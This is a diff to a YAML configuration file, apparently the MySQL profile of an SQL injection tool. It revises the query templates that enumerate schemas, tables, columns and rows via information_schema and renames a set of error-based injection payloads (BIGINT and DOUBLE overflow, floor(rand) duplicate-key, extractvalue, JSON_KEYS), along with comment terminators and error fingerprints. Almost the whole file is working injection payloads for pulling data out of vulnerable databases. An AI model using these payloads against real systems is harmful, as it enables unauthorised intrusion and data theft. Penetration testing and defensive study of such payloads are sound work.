@@ -36,6 +36,8 @@ resource:
        right join INFORMATION_SCHEMA.schemata
        on SCHEMA_NAME = table_schema
        group by r
+       /* Required by Error Extractvalue */
+       order by 1
        ${limit}
    ) x
 
@@ -57,7 +59,8 @@ resource:
            cast(ifnull(table_rows, 0x30) as char) q
        from information_schema.tables
        where TABLE_SCHEMA = 0x${database.hex}
-       order by r
+       /* Required by Error Extractvalue */
+       order by 1
        ${limit}
    ) x
 
@@ -78,7 +81,8 @@ resource:
        from information_schema.columns
        where TABLE_SCHEMA = 0x${database.hex}
        and TABLE_NAME = 0x${table.hex}
-       order by n
+       /* Required by Error Extractvalue */
+       order by 1
        ${limit}
    ) x
 
@@ -101,6 +105,8 @@ resource:
             cast(count(*) as char) q
         from `${database}`.`${table}`
         group by r
+        /* Required by Error Extractvalue */
+        order by 1
         ${limit}
     ) x
    fields:
@@ -110,45 +116,57 @@ resource:
  zipped:
   database: |
    select concat(
-       ${enclose_value_hex},
-       cast(SCHEMA_NAME as char),
-       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
+       group_concat(
+           ${enclose_value_hex},
+           SCHEMA_NAME,
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+       ),
+       '${trail_sql}'
    )
    from INFORMATION_SCHEMA.schemata
    ${limit}
 
   table: |
    select concat(
-       ${enclose_value_hex},
-       cast(TABLE_NAME as char),
-       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
+       group_concat(
+           ${enclose_value_hex},
+           TABLE_NAME,
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+       ),
+       '${trail_sql}'
    )
    from information_schema.tables
-   where TABLE_SCHEMA = 0x${database.hex}
+   where TABLE_SCHEMA = '${database}'
    ${limit}
 
   column: |
    select concat(
-       ${enclose_value_hex},
-       cast(COLUMN_NAME as char),
-       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
+       group_concat(
+           ${enclose_value_hex},
+           COLUMN_NAME,
+           '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+       ),
+       '${trail_sql}'
    )
    from information_schema.columns
-   where TABLE_SCHEMA = 0x${database.hex}
-   and TABLE_NAME = 0x${table.hex}
+   where TABLE_SCHEMA = '${database}'
+   and TABLE_NAME = '${table}'
    ${limit}
 
   row:
    query: |
-          select concat(
-              ${enclose_value_hex},
-              cast(concat(${fields}) as char),
-              '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}${trail_sql}'
-          )
-          from `${database}`.`${table}`
-          ${limit}
+    select concat(
+        group_concat(
+            ${enclose_value_hex},
+            concat(${fields}),
+            '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
+        ),
+        '${trail_sql}'
+    )
+    from ${database}.${table}
+    ${limit}
    fields:
-    field: trim(ifnull(`${field.value}`, 0x20))
+    field: "${field.value}"
     concat: ",0x7f,"
 
  dios:
@@ -237,16 +255,19 @@ strategy:
   calibrator: repeat(${calibrator_hex}, 65536)
   limitBoundary: 0
   # Encoded space mandatory to avoid space cleaning
-  # TODO keep raw space
-  # endingComment: --+-
-  # pentesterlab does not work with --+-, switch to #
-  endingComment: '%23'
+  # pentesterlab does not work with --+-, switch to # %23
+  endingComment: --+-
   fingerprint:
    errorMessage:
-    - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near
+    # Spring
+    - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.*' at line \\d+
+    - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '.*' at line \\d+
+    - Unknown column '.*' in 'where clause'
+    
     - MySQL
-    - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near
     - MariaDB
+   orderByErrorMessage:
+    - Unknown column '1337' in 'order clause'
 
  normal:
   indices: union select ${indices}
@@ -294,14 +315,15 @@ strategy:
    ${boolean.mode} if(
        ${test},
        1,
-       SLEEP(${sleep_time})
+       sleep(${sleep_time})
    )
 
  error:
   method:
   
-   - name: BIGINT::exp:OR
+   - name: Unsigned:or
      query: |
+      /* Data truncation: BIGINT UNSIGNED value is out of range in '<sqli>' */
       or !(
           select *
           from (
@@ -310,7 +332,7 @@ strategy:
       )-~0
      capacity: 453
      
-   - name: BIGINT::exp:AND
+   - name: Unsigned:and
      query: |
       and !(
           select *
@@ -320,7 +342,7 @@ strategy:
       )-~0
      capacity: 453
 
-   - name: BIGINT::exp in Order By
+   - name: Unsigned:order by
      query: |
       1, (
           select 1
@@ -335,7 +357,7 @@ strategy:
       )
      capacity: 453
 
-   - name: BIGINT::exp:OR in Delete Insert Update
+   - name: Unsigned:or Crud
      query: |
       ' or (
           select !(
@@ -347,7 +369,7 @@ strategy:
       ) or '
      capacity: 453
 
-   - name: BIGINT::exp:AND in Delete Insert Update
+   - name: Unsigned:and Crud
      query: |
       ' and (
           select !(
@@ -359,8 +381,9 @@ strategy:
       ) or '
      capacity: 453
 
-   - name: DOUBLE::exp:OR
+   - name: OverDouble:or
      query: |
+      /* Data truncation: DOUBLE value is out of range in '<sqli>' */
       or 1 = exp(
           ~(
               select *
@@ -371,7 +394,7 @@ strategy:
       )
      capacity: 462
 
-   - name: DOUBLE::exp:AND
+   - name: OverDouble:and
      query: |
       and 1 = exp(
           ~(
@@ -383,7 +406,7 @@ strategy:
       )
      capacity: 462
 
-   - name: DOUBLE::exp in Order By
+   - name: OverDouble:order by
      query: |
       1, (
           select exp(
@@ -397,7 +420,7 @@ strategy:
       )
      capacity: 462
 
-   - name: DOUBLE::exp:OR in Delete Insert Update
+   - name: OverDouble:or Crud
      query: |
       ' or (
           select exp(
@@ -411,7 +434,7 @@ strategy:
       ) or '
      capacity: 462
 
-   - name: DOUBLE::exp:AND in Delete Insert Update
+   - name: OverDouble:and Crud
      query: |
       ' and (
           select exp(
@@ -425,13 +448,16 @@ strategy:
       ) or '
      capacity: 462
 
-   - name: GROUPBY::rand:OR
+   - name: Rand:or
      query: |
+      /* Duplicate entry '<sqli>' for key 'group_key' */
       or exists(
           select
               count(*),
               concat(
-                  (${window}),
+                  (
+                      ${window}
+                  ),
                   floor(rand(0)*2)
               )
           from information_schema.tables
@@ -439,13 +465,15 @@ strategy:
       )
      capacity: 64
 
-   - name: GROUPBY::rand:AND
+   - name: Rand:and
      query: |
       and exists(
           select
               count(*),
               concat(
-                  (${window}),
+                  (
+                      ${window}
+                  ),
                   floor(rand(0)*2)
               )
           from information_schema.tables
@@ -453,14 +481,16 @@ strategy:
       )
      capacity: 64
 
-   - name: GROUPBY::rand in Order By
+   - name: Rand:order by
      query: |
       1, (
           select 1 from (
               select
                   count(*),
                   concat(
-                      (${window}),
+                      (
+                          ${window}
+                      ),
                       floor(rand(0)*2)
                   )
               from information_schema.tables
@@ -469,14 +499,16 @@ strategy:
       )
      capacity: 64
 
-   - name: GROUPBY::rand:OR in Delete Insert Update
+   - name: Rand:or Crud
      query: |
       ' or (
           select 1 from (
               select
                   count(*),
                   concat(
-                      (${window}),
+                      (
+                          ${window}
+                      ),
                       floor(rand(0)*2)
                   )
               from information_schema.tables
@@ -485,167 +517,142 @@ strategy:
       ) or '
      capacity: 64
 
-   - name: GROUPBY::rand:AND in Delete Insert Update
+   - name: Rand:and Crud
      query: |
       ' and (
           select 1 from (
               select
                   count(*),
                   concat(
-                      (${window}),
+                      (
+                          ${window}
+                      ),
                       floor(rand(0)*2)
                   )
               from information_schema.tables
               group by 2
           ) x
-      ) or '
-     capacity: 64
-
-   - name: JSON::json_keys:OR
-     query: |
-      or 1 = (
-          select JSON_KEYS (
-              (
-                  select *
-                  from (
-                      ${window}
-                  ) x
-              )
-          )
-      )
-     capacity: 64
-
-   - name: JSON::json_keys:AND
-     query: |
-      and 1 = (
-          select JSON_KEYS (
-              (
-                  select *
-                  from (
-                      ${window}
-                  ) x
-              )
-          )
-      )
-     capacity: 64
-
-   - name: JSON::json_keys in Order By
-     query: |
-      /* Require FALSE statement, then OR */
-      1, (
-          select JSON_KEYS (
-              (
-                  select *
-                  from (
-                      ${window}
-                  ) x
-              )
-          )
-      )
-     capacity: 64
-
-   - name: JSON::json_keys:OR in Delete Insert Update
-     query: |
-      ' or (
-          select JSON_KEYS (
-              (
-                  select *
-                  from (
-                      ${window}
-                  ) x
-              )
-          )
-      ) or '
-     capacity: 64
-
-   - name: JSON::json_keys:AND in Delete Insert Update
-     query: |
-      ' and (
-          select JSON_KEYS (
-              (
-                  select *
-                  from (
-                      ${window}
-                  ) x
-              )
-          )
       ) or '
      capacity: 64
 
    # extractvalue() interpreted whatever :OR :AND
-   - name: XML::extractvalue
+   - name: Extractvalue
      query: |
+      /* XPATH syntax error: '<sqli>' */
       or 1 = extractvalue(
           0x0a,
           concat(
               0x0a,
-              (${window})
+              (
+                  ${window}
+              )
           )
       )
      capacity: 31
 
-   - name: XML::extractvalue in Order By
+   - name: Extractvalue:order by
      query: |
       1, (
-          select 1 from (
-              select extractvalue(
+          select extractvalue(
+              0x0a,
+              concat(
                   0x0a,
-                  concat(
-                      0x0a,
-                      (${window})
+                  (
+                      ${window}
                   )
               )
-          ) x
+          )
       )
      capacity: 31
 
    # extractvalue() interpreted whatever :OR :AND
-   - name: XML::extractvalue in Delete Insert Update
+   - name: Extractvalue:crud
      query: |
       ' or (
-          select 1 from (
-              select extractvalue(
+          select extractvalue(
+              0x0a,
+              concat(
                   0x0a,
-                  concat(
-                      0x0a,
-                      (${window})
+                  (
+                      ${window}
                   )
               )
-          ) x
+          )
       ) or '
      capacity: 31
 
-   - name: BIGINT::if:OR
+   - name: OverInt:or
      query: |
-      or 1 = (SELECT 2*IF((SELECT * FROM 
-          (${window})x
-      ), 4611686018427387904, 4611686018427387904))
+      /* Data truncation: BIGINT value is out of range in '<sqli>' */
+      or 1 = (
+          select 2*if(
+              (
+                  select * from (
+                      ${window}
+                  )x
+              ), 
+              4611686018427387904, 
+              4611686018427387904
+          )
+      )
      capacity: 460
 
-   - name: BIGINT::if:AND
+   - name: OverInt:and
      query: |
-      and 1 = (SELECT 2*IF((SELECT * FROM 
-          (${window})x
-      ), 4611686018427387904, 4611686018427387904))
+      and 1 = (
+          select 2*if(
+              (
+                  select * from (
+                      ${window}
+                  )x
+              ), 
+              4611686018427387904, 
+              4611686018427387904
+          )
+      )
      capacity: 460
 
-   - name: BIGINT::if in Order By
+   - name: OverInt:order by
      query: |
-      1, (SELECT 2*IF((SELECT * FROM 
-          (${window})x
-      ), 4611686018427387904, 4611686018427387904))
+      1, (
+          select 2*if(
+              (
+                  select * from (
+                      ${window}
+                  )x
+              ), 
+              4611686018427387904, 
+              4611686018427387904
+          )
+      )
      capacity: 460
 
-   - name: BIGINT::if:OR in Delete Insert Update
+   - name: OverInt:or Crud
      query: |
-      ' or (SELECT 2*IF((SELECT * FROM 
-          (${window})x
-      ), 4611686018427387904, 4611686018427387904)) or '
+      ' or (
+          select 2*if(
+              (
+                  select * from (
+                      ${window}
+                  )x
+              ), 
+              4611686018427387904, 
+              4611686018427387904
+          )
+      ) or '
      capacity: 460
 
-   - name: BIGINT::if:AND in Delete Insert Update
+   - name: OverInt:and Crud
      query: |
-      ' and (SELECT 2*IF((SELECT * FROM 
-          (${window})x
-      ), 4611686018427387904, 4611686018427387904)) or '
+      ' and (
+          select 2*if(
+              (
+                  select * from (
+                      ${window}
+                  )x
+              ), 
+              4611686018427387904, 
+              4611686018427387904
+          )
+      ) or '
      capacity: 460
